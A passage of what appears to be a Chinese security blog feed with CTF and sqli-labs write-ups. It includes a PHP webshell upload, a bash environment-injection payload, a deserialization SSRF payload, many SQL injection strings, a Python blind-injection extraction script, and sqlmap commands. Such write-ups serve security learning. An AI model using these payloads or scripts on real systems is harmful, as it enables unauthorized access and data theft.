class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upfile&quot;; filename=&quot;3.php.&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;?= @eval($_POST[<span class="string">&#x27;nacl&#x27;</span>]);?&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087--</span></span></span><br></pre></td></tr></table></figure><p>上传木马后直接用任意文件包含来触发木马</p><p>这里使用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112135730.png" alt="image-20240217112135730"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112200847.png" alt="image-20240217112200847"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:37269/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg;%20&#125;</span><br><span class="line"></span><br><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJ3b3JyaWVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">You don<span class="string">&#x27;t know how to pass parameters?</span></span><br></pre></td></tr></table></figure><p>还可以扫出来一个admin.php,本地访问admin.php可以拿到flag</p><p>所以payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38434/</span><br><span class="line">?Harder=O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:26:&quot;http://127.0.0.1/admin.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>fuzz一下会发现禁了information_schema,or,and这些</p><p>首先可以load_file读取源码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;/**/union/**/select/**/load_file(&#x27;/var/www/html/index.php&#x27;)/**/%23</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--flag在flag表里--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$sensitive_keywords</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;handler&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;-~&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--+&quot;</span>, <span class="string">&quot;information&quot;</span>, <span class="string">&quot;xor&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;order&quot;</span>, <span class="string">&quot;floor&quot;</span>,<span class="string">&quot;sys_tables&quot;</span>,<span class="string">&quot;sys_columns&quot;</span>,<span class="string">&quot;sys.schema_table_statistics_with_buffer&quot;</span>,<span class="string">&quot;sys.schema_table_statistics&quot;</span>,<span class="string">&quot;mid&quot;</span>, <span class="string">&quot;ascii&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查参数中是否包含敏感关键词</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$sensitive_keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$username</span>, <span class="variable">$keyword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果参数中包含敏感关键词，弹窗提示用户</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;hacker&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="comment">// 可以选择终止脚本执行或者做其他处理</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from flag where id=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 输出每一行记录的 love 字段值</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;          &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $result-&gt;num_rows;</span></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只输出零时表中的id字段,且flag所在的列名未知</p><p>这里考察了无列名注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=flag&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.20.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 18 Feb 2024 11:14:38 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.3.33</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>249</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">joe好像喜欢alice，但是alice好像不喜欢joe，你要不要查查他们都喜欢谁(?username=joe)或者(?username=alice)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="comment">&lt;!--flag在flag表里--&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>          flag<span class="tag">&lt;<span class="name">br</span>&gt;</span>          2<span class="tag">&lt;<span class="name">br</span>&gt;</span>          SICTF</span><span class="template-variable">&#123;633db818-0209-465a-9d1c-dfbc36a469e3&#125;</span><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>自测一下无列名注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection <span class="built_in">id</span>:    5</span><br><span class="line">Current database: hcj_db</span><br><span class="line"></span><br><span class="line">+----+------------+----------+</span><br><span class="line">| <span class="built_in">id</span> | username   | password |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">|  1 | hcj        | 123456   |</span><br><span class="line">|  2 | nacl       | 123456   |</span><br><span class="line">| 13 | cabbage    | 12345678 |</span><br><span class="line">| 14 | qwert      | qwert    |</span><br><span class="line">| 15 | qwerty     | qwerty   |</span><br><span class="line">| 16 | cabbaget   | 12345678 |</span><br><span class="line">| 17 | cabbagety  | 12345678 |</span><br><span class="line">| 18 | asdf       | asdf     |</span><br><span class="line">| 19 | asdfg      | asdfg    |</span><br><span class="line">| 20 | www        | wwww     |</span><br><span class="line">| 21 | sss        | sss      |</span><br><span class="line">| 22 | cabbagetya | 12345678 |</span><br><span class="line">| 23 | ddd        | ddd      |</span><br><span class="line">| 24 | xxx        | xxx      |</span><br><span class="line">| 25 | fff        | fff      |</span><br><span class="line">| 26 | ffff       | fff      |</span><br><span class="line">| 27 | fffff      | fff      |</span><br><span class="line">| 28 | <span class="built_in">cat</span>        | <span class="built_in">cat</span>      |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">18 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">id</span> from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>= 1 union <span class="keyword">select</span> `2` from (<span class="keyword">select</span> 1,2,3 union <span class="keyword">select</span> * from <span class="built_in">users</span>)a;</span><br><span class="line">+------------+</span><br><span class="line">| <span class="built_in">id</span>         |</span><br><span class="line">+------------+</span><br><span class="line">| 1          |</span><br><span class="line">| 2          |</span><br><span class="line">| hcj        |</span><br><span class="line">| nacl       |</span><br><span class="line">| cabbage    |</span><br><span class="line">| qwert      |</span><br><span class="line">| qwerty     |</span><br><span class="line">| cabbaget   |</span><br><span class="line">| cabbagety  |</span><br><span class="line">| asdf       |</span><br><span class="line">| asdfg      |</span><br><span class="line">| www        |</span><br><span class="line">| sss        |</span><br><span class="line">| cabbagetya |</span><br><span class="line">| ddd        |</span><br><span class="line">| xxx        |</span><br><span class="line">| fff        |</span><br><span class="line">| ffff       |</span><br><span class="line">| fffff      |</span><br><span class="line">| <span class="built_in">cat</span>        |</span><br><span class="line">+------------+</span><br><span class="line">20 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> SSRF </tag>
            
            <tag> php环境变量注入 </tag>
            
            <tag> sql无列名注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2024/02/18/sqli-labs/"/>
      <url>/2024/02/18/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:emails,referers,uagents,users</p><p>Your Password:3</p><p>普通的字符型联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password</p><p>Your Password:3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(id,username,password),3 from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>和Less-1 几乎相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql-labs/Less-1/</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(id,username,password) from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>输入: ?id&#x3D;1’</p><p>……..for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 </p><p>关键在: <code>&#39;  &#39;1&#39;&#39;) LIMIT 0,1 &#39;</code></p><p>系统给输入的内容增加了一个<code>&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,database()%23</span><br></pre></td></tr></table></figure><p>其余步骤与前几关相同</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>输入单引号并不报错,而输入双引号会报错</p><p>与Less-3 类似,只不过使用了<code>&quot;)</code>包裹字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>没有回显username,报错注入秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>看网上还有用group by 双查询注入的</p><p>关于双查询注入:</p><p><a href="https://juejin.cn/post/7276696853893627956">https://juejin.cn/post/7276696853893627956</a></p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>Less-5的单引号闭合改为双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>也可以用extractvalue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database()))%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))%23</span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这关用<code>((&#39;  &#39;))</code>包裹变量</p><p>测试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and sleep(5)%23</span><br></pre></td></tr></table></figure><p>这里很明显可以使用时间注入</p><p>不过测试了一下发现布尔盲注也是可以的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and ascii(substr(database(),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>不过应该都是非预期,网上还有另一种方法,正是使用提示中的<code>outfile</code></p><p><strong><strong>文件上传</strong></strong></p><p>需要更改mysql的配置文件,将 secure-file-priv 置为空,即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv=</span><br></pre></td></tr></table></figure><p>之后编写payload:</p><p>1’)) union select 1,2,database() into outfile ‘文件要被保存的路径’%23</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>探测到闭合方式为单引号,且无回显,但可以利用是否返回<code>You are in...........</code>来实现布尔注入</p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">host = <span class="string">&quot;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"><span class="comment">#sql = &quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and (ascii(substr(&quot;</span>+ <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>实际上可以sqlmap一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> --dbs</span><br><span class="line"></span><br><span class="line">available databases [6]:</span><br><span class="line">[*] `security`</span><br><span class="line">[*] ctftraining</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span 